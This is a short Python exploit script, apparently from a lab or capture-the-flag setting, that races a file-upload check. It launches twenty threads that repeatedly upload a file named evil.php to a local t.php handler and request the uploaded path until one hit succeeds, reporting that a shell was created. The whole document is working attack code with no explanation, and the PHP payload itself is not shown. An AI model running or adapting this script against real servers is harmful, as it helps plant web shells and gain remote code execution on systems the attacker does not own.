import requests
import threading
import os

class RaceCondition(threading.Thread):
    def __init__(self,file_name):
        threading.Thread.__init__(self)
        self.uploaded_file = "http://127.0.0.1/upload/evil.php"
        self.url = "http://127.0.0.1/t.php"

    def _upload(self):
        print("upload file.....")
        file = {"file":open("evil.php","r")}
        requests.post(self.url, files=file)

    def _visit_uploaded(self):
        print("[+]    visiting  ......")
        resp = requests.get(url=self.uploaded_file)
        if(resp.status_code == 200):
            print("[+]  shell.php created successfully !!!")
            os._exit(0)

    def run(self):
        while True:
            self._visit_uploaded()
            self._upload()

if __name__ == "__main__":
    for i in range(20):
        t = RaceCondition("evil.php")
        t.start()

    t.join()